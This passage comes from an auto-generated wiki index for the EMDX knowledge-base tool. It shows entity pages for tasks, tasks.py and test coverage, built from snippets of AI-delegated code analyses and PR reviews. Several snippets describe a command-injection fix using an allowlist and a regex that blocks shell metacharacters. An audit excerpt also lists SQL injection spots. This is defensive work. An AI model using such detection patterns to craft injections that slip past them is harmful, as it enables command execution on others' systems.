PMI=5.1)</li> <li><code>update_execution_heartbeat()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.0)</li> <li><code>get_stale_executions()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.0)</li> <li><code>message</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>last_heartbeat</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=4.8)</li> </ul>"},{"location":"entities/tasks/","title":"tasks","text":"<p>Type: tech_term | Mentioned in: 29 documents | First seen: 2026-01-15</p>"},{"location":"entities/tasks/#documents-29","title":"Documents (29)","text":"<ul> <li> <p>#6839 Delegate: list   Section: 1. <code>emdx/commands/delegate.py</code> \u2014 Subcommand routing fix</p> <p>....py<code>. This happened because typer's</code>invoke_without_command=True<code>with a variadic</code>tasks` argument swallowed the subcommand name before click could dispatch it. There was no routing logic to detect and re-dispatch subcommands.</p> </li> <li> <p>#6838 Delegate: list [1/3]</p> <p>...outing fix. They dispatched <code>emdx delegate \"list\" \"--limit\" \"3\"</code> as three parallel tasks, where:</p> </li> <li>Task 1/3: prompt = \"list\"</li> <li>Task 2/3: prompt = \"--limit\"  </li> <li> <p>Task 3/3: prompt = \"3\"</p> </li> <li> <p>#6837 Delegate: list [1/2]   Section: Fix: Delegate subcommand routing (<code>list</code>, <code>running</code>, <code>stats</code>, etc.)</p> <p>...ir subcommands. This is because Typer's <code>invoke_without_command=True</code> + variadic <code>[TASKS]...</code> positional argument swallowed subcommand names as task arguments \u2014 spawning Claude agents with prompts like \"list\" instead of showing execution history.</p> </li> <li> <p>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]   Section: Summary</p> <p>...ult.to_dict()<code>:</code>parent_task_id<code>,</code>task_count<code>,</code>succeeded<code>,</code>failed<code>,</code>doc_ids<code>,</code>tasks<code>array,</code>total_duration_seconds<code>,</code>total_duration`</p> </li> <li> <p>Note about <code>synthesis</code> object when <code>--synthesize</code> is used</p> </li> <li> <p>#6713 wiki-schema-research   Section: Current Schema Inventory (Relevant Tables)</p> <p>...text, embedding | | <code>tags</code> / <code>document_tags</code> | Tag system | name, document_id | | <code>tasks</code> | Task management | title, status, epic_key, type |</p> </li> <li> <p>#6707 Delegate: Analyze the current Task screen (emdx/ui/task_view.py, task_ [2/4]   Section: What It Shows</p> <ul> <li>Left pane (40%): A <code>DataTable</code> listing tasks grouped by status</li> </ul> </li> <li> <p>Right pane (60%): A <code>RichLog</code> showing the full detail of the selected task</p> </li> <li> <p>#6706 Delegate: Analyze the current Activity screen (emdx/ui/activity/) in d [1/4]   Section: What Data It Loads</p> <p>...et_agent_executions()<code>with 7-day cutoff, limit=30. Joins</code>executions<code>table with</code>tasks` table. Skips completed executions that produced a doc (avoids duplicates since the doc itself shows)</p> </li> <li> <p>#6568 Delegate: Review the synthesis prompt construction in _run_parallel \u2014  [2/3]   Section: Content Collection (Lines 774-792)</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Overview</p> <p>...command is the unified interface for one-shot AI task execution in EMDX. It routes tasks to Claude agents, captures their output to stdout (for inline reading by the caller), and persists results to the knowledge base for searchability.</p> </li> <li> <p>#6477 EMDX Task System: Unified Architecture and Simplification Strategy   Section: 1. Core Overlap: Tasks vs Tagged Documents**</p> <p>...<code>gameplan_id</code> \u2192 documents | <code>parent_id</code> + \ud83c\udfafgameplan tag | | Work items | Separate <code>tasks</code> table | Documents with \"task\" tag | | Progress logging | <code>task_log</code> table | Child documents with <code>relationship='log'</code> | | Priority | 1-5 priority system | Priority...</p> </li> <li> <p>#6411 Delegate: Implement 'emdx briefing' command. This is a new command tha   Section: Summary</p> <p>Implemented the <code>emdx briefing</code> command that synthesizes recent emdx activity into a human-readable summary. This provides a quick overview of what happened across tasks, documents, and delegate executions since a configurable cutoff time.</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>..., edit, delete, find, list, recent). Bread and butter of the knowledge base. | | tasks.py | 389 | VALUABLE - Work queue for Claude sessions. Simple, focused, integrates well with delegate. | | tags.py | 426 | USEFUL - Tagging system with...</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...py`: tag add/remove/list/rename/merge/batch</p> </li> <li><code>trash.py</code>: trash, restore, purge</li> <li><code>tasks.py</code>: agent work queue with dependencies</li> <li><code>groups.py</code>: hierarchical document organization</li> <li><code>prime.py</code>: session priming context</li> <li> <p><code>status.py</code>: project status overvie...</p> </li> <li> <p>#6283 Delegate synthesis [synthesis]   Section: 3. Database Migration Debt Fixed (PR #512)</p> <ul> <li>11 foreign keys changed from <code>ON DELETE NO ACTION</code> \u2192 <code>ON DELETE SET NULL</code></li> </ul> </li> <li>Added <code>LOWER(title)</code> indexes on <code>documents</code> and <code>tasks</code> tables</li> <li> <p>Preserves execution/task history when related records deleted</p> </li> <li> <p>#6271 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [33/37]   Section: Foreign Keys Missing ON DELETE Behavior</p> <p>executions table:</p> </li> <li><code>doc_id -&gt; documents(id)</code> </li> <li><code>task_id -&gt; tasks(id)</code></li> <li> <p><code>cascade_run_id -&gt; cascade_runs(id)</code></p> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: Data Written to DB by Delegate</p> <p>tasks table:</p> </li> <li><code>prompt</code>: First 500 chars of prompt</li> <li><code>type</code>: \"single\", \"group\", or \"chain\"</li> <li><code>execution_id</code>: Set after UnifiedExecutor returns</li> <li><code>output_doc_id</code>: Set when agent saves output doc</li> <li> <p><code>status</code>: \"active\" \u2192 \"done\"/\"failed\"</p> </li> <li> <p>#6172 Delegate: Analyze competing/overlapping concepts in emdx. The system h [8/15]   Section: Executive Summary</p> <p>...erlap:</p> </li> <li>Documents with Tags (status tags like \ud83d\ude80active, \u2705done, \ud83d\udea7blocked)</li> <li>Tasks (separate table with status, dependencies, gameplan_id)</li> <li>Cascade (document stages: idea \u2192 prompt \u2192 analyzed \u2192 planned \u2192 done)</li> <li> <p>Delegate Executions (exe...</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: Overview</p> <p>...table** (via <code>emdx/models/task_executions.py</code>) - Task-to-execution linking </p> </li> <li> <p><code>tasks</code> table (via <code>emdx/models/tasks.py</code>) - High-level delegate task tracking</p> </li> <li> <p>#6169 Delegate: Analyze the task runner service. Read emdx/services/task_run [3/15]   Section: How <code>emdx task run</code> Works</p> <ol> <li>Entry Point: <code>emdx/commands/tasks.py:run()</code> (lines 239-262)</li> </ol> </li> <li>Validates task exists and status is <code>open</code> or <code>blocked</code></li> <li>Checks all dependencies are satisfied</li> <li> <p>Calls <code>run_task()</code> from task_runner service</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Summary</p> <p>Tasks are NOT integrated into the TUI. There is no Task Browser in the GUI. Tasks exist purely as CLI entities (<code>emdx task</code> commands) with no visual representation in the Textual TUI.</p> </li> <li> <p>#6166 Delegate: Analyze how tasks integrate with cascade. Read emdx/commands [5/15]   Section: Executive Summary</p> <p>Cascade does NOT currently use tasks. These are two independent systems with conceptual overlap. There may be opportunities to integrate them, but the current architecture keeps them separate.</p> </li> <li> <p>#6161 Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]   Section: <code>emdx prime</code> \u2014 Session Context Injection</p> <ol> <li>Ready Tasks (lines 178-193)</li> </ol> </li> <li>Query: Open tasks with no blocking dependencies (uses <code>task_deps</code> table)</li> <li> <p>Fields shown: <code>id</code>, <code>title</code>, <code>description</code> (verbose only), `prio...</p> </li> <li> <p>#5183 Gameplan: Implement Task-Driven Workflows   Section: Gameplan: Implement Task-Driven Workflows</p> </li> <li> <p>#6812 Delegate: Fix DOC-9: Update docs/architecture.md to reflect v0.20.0 TU [4/5]   Section: Changes to <code>docs/architecture.md</code></p> <p>...escription):</p> </li> <li>Documented three-tier dashboard: RUNNING (active executions), TASKS (ready/active), DOCS (recent history)</li> <li> <p>Described <code>ActivityDataLoader</code> deduplication logic (tasks with <code>execution_id</code> skip duplicates; <code>output_doc_id</code> removes...</p> </li> <li> <p>#6710 Delegate: Design a unified dashboard data model. Given that we want to [4/4]   Section: Common Interface</p> Field Documents Executions Tasks <code>item_id</code> doc ID execution ID task ID <code>title</code> doc title execution title task title <code>timestamp</code> c... </li> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: The <code>executions</code> Table Schema (final form)</p> <p>...INTEGER (nullable) | FK to cascade_runs | | <code>task_id</code> | INTEGER (nullable) | FK to tasks table | | <code>cost_usd</code> | REAL DEFAULT 0.0 | Total cost in USD | | <code>tokens_used</code> | INTEGER DEFAULT 0 | Total token count | | <code>input_tokens</code> | INTEGER DEFAULT 0 | Input...</p> </li> <li> <p>#6408 EMDX Strategy v2: Dual-Interface Knowledge Layer   Section: What's Good for Humans vs Agents</p> <p>...s, tag filters, <code>prime --json</code> | | Organizes | Hierarchy (epics \u2192 categories \u2192 tasks) | Flat queue (<code>task ready</code> \u2192 execute) | | Consumes | Rendered markdown, TUI, emoji tags | Raw text, JSON, piped content | | Tasks | Reminders, planning, pro...</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Overview</p> <ol> <li>tasks - Core task records with workflow/delegate tracking</li> </ol> </li> <li> <p>task_executions - Join table linking tasks to execution records</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Summary</p> <p>Delegate creates and updates tasks for every execution. There are two separate tracking systems (tasks and executions) that run in parallel, creating overlap.</p> </li> </ul>"},{"location":"entities/tasks/#add-successful-task-results","title":"Add successful task results","text":"<p>for i in range(len(tasks)):     r = results.get(i)     if r and r.doc_id is not None:         doc = get_document(r.doc_id)         if doc:             combined.append(                 f\"## T...</p>"},{"location":"entities/tasks/#overview","title":"Overview","text":"<p>Refactor workflow system so tasks are runtime input, not hardcoded prompts.</p>"},{"location":"entities/tasks/#related-entities","title":"Related Entities","text":"<ul> <li><code>tasks[0]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>task_log</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.6)</li> <li><code>gameplan_id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.5)</li> <li><code>task_executions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=4.4)</li> <li><code>task_deps</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=4.4)</li> <li><code>depends_on</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.3)</li> <li><code>task tracking</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.1)</li> <li><code>retry_of</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.1)</li> <li><code>cascade_runs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.1)</li> <li><code>activitydataloader</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.1)</li> </ul>"},{"location":"entities/taskspy/","title":"tasks.py","text":"<p>Type: heading | Mentioned in: 25 documents | First seen: 2026-01-05</p>"},{"location":"entities/taskspy/#documents-25","title":"Documents (25)","text":"<ul> <li>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis </li> <li><code>doc: int | None = typer.Option(None, ...)</code> - Legitimate: optional doc link</li> <li> <p><code>description: str | None = typer.Option(None, ...)</code> - Legitimate: optional de...</p> </li> <li> <p>#6433 Any/None typing audit [2/5]   Section: Recommendations</p> <p>...m priority**: Replace <code>list[Any]</code> SQL params with <code>list[str | int]</code> in tags.py and tasks.py</p> </li> <li>Lower priority: For <code>**kwargs: Any</code> in update functions, consider:</li> <li>Python 3.12+: Use <code>TypedDict</code> + <code>Unpack[T]</code> </li> <li> <p>Python 3.11: Document allowed keys o...</p> </li> <li> <p>#6416 Type System Audit: Replace Any/None with Concrete Types [1/4]</p> <p><code>list_all_tags(sort_by: str = \"usage\") -&gt; list[dict[str, Any]]</code> Location: Line 191 Current: Returns tag statistics Keys:</p> </li> <li><code>id: int</code> \u2014 Tag ID</li> <li><code>name: str</code> \u2014 Tag name (normalized to emoji)</li> <li><code>count: int</code> \u2014 Usage count</li> <li> <p>`created_at: datet...</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]</p> <p>tasks - Core task records with workflow/delegate tracking</p> </li> <li>task_executions - Join table linking tasks to execution records</li> </ul>"},{"location":"entities/taskspy/#taskspy_1","title":"tasks.py","text":""},{"location":"entities/taskspy/#task-model-emdxmodelstaskspy","title":"Task Model (<code>emdx/models/tasks.py</code>)","text":""},{"location":"entities/taskspy/#task-fields","title":"Task Fields","text":"<p>| Field | Type | Default | Description | |-------|----...</p> <ul> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: Recommendation: Three-Tier Scoring with Noise Filtering</p> <p>...N | 532 | <code>command injection</code>, <code>emdx delegate</code> | | PY_FILE | 173 | <code>delegate.py</code>, <code>tasks.py</code> | | FILE_PATH | 115 | <code>emdx/commands/delegate.py</code> | | FUNC_CALL | 53 | <code>_run_discovery()</code>, <code>shlex.split()</code> | | CLI_FLAG | 27 | <code>--each</code>, <code>--json</code> | | SUMMARY_NOISE...</p> </li> <li> <p>#6574 Delegate synthesis [synthesis]   Section: Key Findings</p> File Role Lines <code>core.py</code> Foundation CRUD (save, find, view, edit, delete) 1,227 <code>delegate.py</code> AI orchestration &amp; parallel task execution 1,180 <code>tasks.py</code> Work queue &amp; dependency management 462 </li> <li> <p>#6573 Delegate: List the 3 most important files in emdx/commands/ and say on [1/2]   Section: 3 Most Important Files in emdx/commands/</p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Files by Priority</p> <p>...m | <code>palette_presenter.py</code> | 5 | 5 | | Medium | <code>text_areas.py</code> | 3 | 3 | | Low | <code>tasks.py</code> | 2 | 1 | | Low | <code>executions.py</code> | 1 | 1 | | Keep | <code>retry.py</code> | 8 | 0 | | Keep | <code>output.py</code> | 1 | 0 |</p> </li> <li> <p>#6437 Any/None typing audit [synthesis]   Section: Actionable Items</p> <p>...--| | <code>tags.py:search_by_tags</code> | <code>params: list[Any]</code> | Use <code>list[str \\| int]</code> | | <code>tasks.py</code> (3 locations) | <code>params: list[Any]</code> | Use <code>list[str \\| int]</code> | | <code>documents.py</code>, <code>search.py</code>, <code>cascade.py</code> | <code>params: list[Any]</code> | Use <code>list[str \\| int]</code> or `SqlPar...</p> </li> <li> <p>#6428 Add TaskDict TypedDicts to models layer   Section: Add TypedDict definitions to models layer</p> </li> <li> <p>#6404 Bug Fix PR Reviews [6/6]   Section: Review Summary</p> <p>..._execution_stats() (2 locations)</p> </li> <li><code>tags.py</code>: get_or_create_tag(), merge_tags()</li> <li> <p><code>tasks.py</code>: create_task() epic_seq</p> </li> <li> <p>#6396 Delegate: DB Safety Fixes (Tasks #620, #624, #626, #629)   Section: Summary</p> <p>..._documents()<code>,</code>get_stats()`</p> </li> <li><code>tags.py</code>: <code>get_or_create_tag()</code>, <code>merge_tags()</code></li> <li><code>tasks.py</code>: <code>create_task()</code> epic_seq</li> <li><code>executions.py</code>: <code>get_execution_stats()</code></li> <li> <p><code>groups.py</code>: <code>get_recursive_doc_count()</code>, <code>_update_group_metrics()</code></p> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: SQL Injection Vectors (Controlled but Risky)</p> File Line Issue <code>groups.py</code> 155 Dynamic column names from dict keys <code>tasks.py</code> 174 Column names interpolated without whitelist <code>migrations.py</code> 1830, 1954 Dynamic ALTER TABLE construction </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Layer Structure (Current)</p> <p>...\u2502 \u2502 \u251c\u2500\u2500 tags.py       Raw SQL operations                        \u2502 \u2502 \u2514\u2500\u2500 tasks.py      Raw SQL operations                        \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 database/         Core database operations...</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...py`: tag add/remove/list/rename/merge/batch</p> </li> <li><code>trash.py</code>: trash, restore, purge</li> <li><code>tasks.py</code>: agent work queue with dependencies</li> <li><code>groups.py</code>: hierarchical document organization</li> <li><code>prime.py</code>: session priming context</li> <li> <p><code>status.py</code>: project status overview</p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: 1. CRITICAL: <code>models/</code> is Actually a Database Layer**</p> <p>Files: <code>models/tags.py</code>, <code>models/tasks.py</code>, <code>models/executions.py</code>, <code>models/documents.py</code></p> </li> <li> <p>#6178 Delegate: Research task management CLI tools and how they work alongsi [10/15]</p> </li> </ul>"},{"location":"entities/taskspy/#3-taskspy-462-lines","title":"3. <code>tasks.py</code> (462 lines)","text":"<p>The work queue system \u2014 provides task add/list/ready/active/done commands that let agents track work items, manage dependencies, and maintain state across sessions.</p>"},{"location":"entities/taskspy/#summary","title":"Summary","text":"<p>Created <code>emdx/models/types.py</code> with TypedDict definitions and updated return type annotations in <code>tasks.py</code>, <code>categories.py</code>, and <code>tags.py</code>.</p>"},{"location":"entities/taskspy/#industry-landscape-design-philosophies","title":"Industry Landscape: Design Philosophies","text":""},{"location":"entities/taskspy/#todotxt-radical-simplicity","title":"Todo.txt \u2014 Radical Simplicity","text":"<p>Source: todo.txt primer</p> <ul> <li>Philosophy: \"The file contents should be human-readable without requiring any tools\"</li> <li> <p>**Core ins...</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>...y.py<code>) | |</code>status.py<code>| \u274c NO | |</code>tags.py<code>| \u2705 YES (</code>test_commands_tags.py<code>) | |</code>tasks.py<code>| \u274c NO | |</code>trash.py` | \u274c NO |</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...... [00:03:14] \ud83d\udcc4 Tool result: emdx/main.py:1 emdx/commands/gist.py:1 emdx/commands/tasks.py:1 emdx/commands/export.py:1 emdx/comma... [00:03:14] \ud83d\udcc4 Tool result: bfff863 Merge branch 'main' of https://github.com/arockwell/emdx a94e6d5 Merge remote-tracking br...</p> </li> <li> <p>#1835 Architecture Analysis: EMDX Control Center v5 Implementation   Section: 3. Missing Models</p> <p>Need in <code>/emdx/models/</code>:</p> </li> <li><code>gameplans.py</code> - Gameplan CRUD and queries</li> <li><code>tasks.py</code> - Task CRUD and status transitions</li> <li> <p><code>work_log.py</code> - Work log operations</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...necessary</p> </li> <li>cascade.py: All necessary (7 typer options + function params)</li> <li>tasks.py: All necessary</li> <li>groups.py: All necessary</li> <li>maintain.py: All necessary (return types)</li> <li>tags.py: All necessary</li> <li>stale.py: All necessary</li> <li> <p>**recipe...</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...| | <code>emdx/commands/review.py</code> | 2 | 2 | Simple JSON serialization | | <code>emdx/models/tasks.py</code> | 2 | 2 | TaskDict fields | | <code>emdx/models/executions.py</code> | 1 | 1 | Simple kwargs | | <code>emdx/database/groups.py</code> | 1 | 1 | Simple kwargs | | <code>emdx/utils/output.py</code> |...</p> </li> <li> <p>#6456 Delegate: List the 3 most important Python files in the emdx/commands/   Section: 3 Most Important Python Files in emdx/commands/</p> <ol> <li>tasks.py \u2014 Provides the agent work queue system for creating, tracking, and managing tasks with status and dependencies.</li> </ol> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>..., edit, delete, find, list, recent). Bread and butter of the knowledge base. | | tasks.py | 389 | VALUABLE - Work queue for Claude sessions. Simple, focused, integrates well with delegate. | | tags.py | 426 | USEFUL - Tagging system with emo...</p> </li> <li> <p>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 4. Workflow Execution Type \u2014 RUNTIME CONCERN (3 hits)</p> <p>File: <code>emdx/commands/tasks.py</code></p> </li> </ul>"},{"location":"entities/taskspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.1)</li> <li><code>epics.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> <li><code>categories.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.9)</li> <li><code>allowed_execution_columns</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.8)</li> <li><code>review.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.7)</li> <li><code>retry.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.7)</li> <li><code>tags.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (14 shared docs, PMI=4.6)</li> <li><code>executions.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (14 shared docs, PMI=4.6)</li> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=4.6)</li> <li><code>emdx/models/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.5)</li> </ul>"},{"location":"entities/test-coverage/","title":"test coverage","text":"<p>Type: heading | Mentioned in: 34 documents | First seen: 2026-01-14</p>"},{"location":"entities/test-coverage/#documents-34","title":"Documents (34)","text":"<ul> <li> <p>#6553 Delegate: Review PR #656 using 'gh pr view 656' and 'gh pr diff 656'.  [4/6]   Section: Summary</p> <p>PR #656 adds comprehensive test coverage for the QA presenter component (<code>emdx/ui/qa/qa_presenter.py</code>).</p> </li> <li> <p>#6538 Delegate: Add missing tests for the --task and --done flags in emdx sa [1/3]</p> <p>These flags were implemented in PR #649 to allow linking saved documents to tasks and optionally marking those tasks as done. ## Test Coverage</p> </li> </ul> <p>Created <code>tests/test_save_task_flags.py</code> with 9 test cases across 4 test classes:</p>"},{"location":"entities/test-coverage/#testsavetaskflag-2","title":"TestSaveTaskFlag (2 ...","text":"<ul> <li>#6529 Delegate: Review GitHub PR #652 using 'gh pr view 652' and 'gh pr diff [1/4]   Section: Strengths \u2705 <p>...le recipes (no step headers) still work via delegate subprocess</p> </li> <li>Comprehensive test coverage - 3 new test files with ~440 lines of tests</li> <li>Good error handling - Input validation, step failure detection, worktree cleanup</li> <li> <p>**Well-documented docstrings...</p> </li> <li> <p>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Implementation Details</p> </li> <li>Tests for <code>_make_pr_instruction()</code> with draft=True/False</li> <li>Tests for draft parameter propagation through call chain</li> <li> <p>71 tests in <code>test_delegate_commands.py</code> all pass</p> </li> <li> <p>#6468 Security Fix Implementation for EMDX Delegate Command</p> <p>Input Validation</p> </li> </ul> <p>Added <code>_validate_discovery_command()</code> function that: - Uses <code>shlex.split()</code> for safe command parsing - Extracts base command name (handles absolute paths like <code>/usr/bin/fd</code>) - Validates command against the allowlist - Rejects danger...</p> <ul> <li>#6465 Security Audit and Fixes: EMDX Command Injection Vulnerability   Section: Test Categories </li> <li>New security tests added: 50+ across all implementations</li> <li>All tests passing: 100% success rate</li> <li> <p>Full test suite: 800+ tests remain passing</p> </li> <li> <p>#6406 Bug Fix PR Reviews [synthesis]</p> <p>PR #589: Add test for invalid stage <code>ValueError</code> validation</p> </li> <li>PR #592: Consider cleanup of old <code>.pkl</code> cache files for cleaner migration</li> </ul>"},{"location":"entities/test-coverage/#test-coverage_1","title":"Test Coverage","text":""},{"location":"entities/test-coverage/#total-test-coverage","title":"Total Test Coverage","text":""},{"location":"entities/test-coverage/#test-coverage_2","title":"Test Coverage","text":"<ul> <li>All PRs report passing test suites</li> <li> <p>No ruff violations detected in reviewed files -...</p> </li> <li> <p>#6403 Bug Fix PR Reviews [1/6]   Section: Edge Cases Analysis</p> </li> <li>92 cascade-related tests pass per PR checklist</li> <li>Existing tests in <code>test_cascade_metadata.py</code> cover insert/update/remove flows</li> <li> <p>Gap: No test for invalid stage <code>ValueError</code> - recommend adding one</p> </li> <li> <p>#6339 Delegate: R2: Add retry logic for network/IO operations   Section: R2: Add Retry Logic for Network/IO Operations</p> </li> <li><code>tests/test_retry.py</code>: 24 comprehensive tests covering:</li> <li>Basic retry behavior on TimeoutError, ConnectionError</li> <li>Max retry limits</li> <li> <p>NonRetryableError and Re...</p> </li> <li> <p>#6320 Delegate: Add comprehensive test coverage for the delegate command (em</p> </li> </ul>"},{"location":"entities/test-coverage/#test-coverage_3","title":"Test Coverage","text":""},{"location":"entities/test-coverage/#test-coverage_4","title":"Test Coverage","text":""},{"location":"entities/test-coverage/#comprehensive-test-coverage-for-delegate-command","title":"Comprehensive Test Coverage for Delegate Command","text":""},{"location":"entities/test-coverage/#summary","title":"Summary","text":"<p>Added 56 comprehensive tests for <code>emdx/commands/delegate.py</code> in <code>tests/test_delegate_commands.py</code>. ## Test Coverage</p>"},{"location":"entities/test-coverage/#helper-functions","title":"Helper Functions","text":"<ul> <li> <p>_slugify_title: 11 tests covering prefix st...</p> </li> <li> <p>#6300 Delegate: DEBT-27: Add async test coverage for UI components. The audi   Section: DEBT-27: Add Async Test Coverage for UI Components</p> </li> <li>Document Loading: Empty database, with data, pagination (has_more)</li> <li> <p>Search: Filter with results...</p> </li> <li> <p>#6283 Delegate synthesis [synthesis]</p> <p>Dependency groups - Split test vs lint deps (low priority)</p> </li> <li>Document breaking changes - Ensure <code>--each</code> limitations are communicated</li> </ul>"},{"location":"entities/test-coverage/#test-coverage_5","title":"Test Coverage","text":"<p>The tests focus on the most critical async UI functions:</p>"},{"location":"entities/test-coverage/#test-coverage_6","title":"Test Coverage","text":"<ul> <li>812+ tests passing across all changes</li> <li> <p>Security test suite specifically covers in...</p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]</p> <p>Validation Function New <code>_validate_discovery_command()</code> function:</p> </li> <li>Parses command with <code>shlex.split()</code> for safe tokenization</li> <li>Extracts base command name (handles absolute paths like <code>/usr/bin/fd</code>)</li> <li>Validates against allowlist</li> <li> <p>Blocks shell metach...</p> </li> <li> <p>#6265 Delegate: Document #6230 - Security Fix Implementation</p> <p>Safe Execution</p> </li> </ul> <pre><code># AFTER (secure):\nargs = _validate_discovery_command(command)  # Validates &amp; parses\nresult = subprocess.run(\n    args,\n    shell=False,  # SECURITY: Never use shell=True with user input\n    ... )\n</code></pre>"},{"location":"entities/test-coverage/#test-coverage_7","title":"Test Coverage","text":"<p>Added ...</p> <ul> <li>#6250 Delegate: Security Fix - Command Injection in --each <p>Added error handling for malformed commands and missing executables</p> </li> <li>Added 11 comprehensive tests covering injection prevention scenarios</li> </ul>"},{"location":"entities/test-coverage/#security-impact","title":"Security Impact","text":"<p>Shell metacharacters are now treated as literal arguments: - <code>;</code> and <code>&amp;&amp;</code> - Comm...</p> <ul> <li>#6245 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [2/37] <p>Shell Metacharacter Blocking Regex <code>[;&amp;|</code>$(){}[]&lt;&gt;!\\</p> </li> </ul> <p>]<code>blocks injection attempts: - Command chaining:</code>;<code>,</code>&amp;&amp;<code>,</code>||<code>- Pipes:</code>|<code>- Command 